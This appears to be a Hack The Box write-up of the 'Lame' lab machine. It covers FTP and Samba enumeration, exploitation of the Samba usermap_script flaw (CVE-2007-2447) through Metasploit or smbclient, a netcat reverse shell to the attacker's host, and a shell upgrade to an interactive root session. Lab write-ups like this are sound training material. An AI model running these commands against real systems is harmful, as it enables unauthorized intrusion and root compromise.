![](assets/banner.png)


<p align="center">
  <img src="assets/htb.png" alt='HTB_logo'>
</p>


#### Enumeration 
- Open ports `21,22,139,445`
- FTP `anonymous` login allowed, nothing enumerated
- Enumerating the samba shares, `tmp` share is accessable
- Confirming the shared folders accessability via `enum4linux`
- Searchsploit on `samba 3.0.20` reveals `CVE-2007-2447`


#### Obtaining Shell
##### With MSF:
- `use exploit/multi/samba/usermap_script`
- Setting rhosts, and exploit
- Obtained shell as `root` 

##### With Samba logon():
- logging into the /tmp shared folder
- using the logon command available for smb, a reverse shell is obtained via nc
- Obtained shell as `root`

#### Commands:

**ftp anonymous login**
```bash
ftp 10.10.10.3
> password: <ENTER>
```

**Samba enumeration**
```bash
# smbclient enumeration
smbclient -L 10.10.10.3
# enum4linux
enum4linux -S 10.10.10.3
# accessing shared folders via smbclient
smbclinet //10.10.10.3/tmp
```

**Netcat commands**
```bash
# Obtaining a reverse shell, sends the remote machine's(LAME's) bash to hacker's machine (10.10.14.6)
nc 10.10.14.6 1337 -e /bin/bash
# waiting dfor incoming connection
nc -lvnp 1337
```

**Interactive shell**
```bash
# waiting for the connection
nc -lvnp 1337
# after getting connection, confirming the version of python
which python
# obtaining bash via python
python -c 'import pty;pty.spawn("/bin/bash");'
# to use tab auto completion
<ctrl + z>
stty raw -echo
fg
<enter>
<enter>
# Fully interactive shell obtained
```
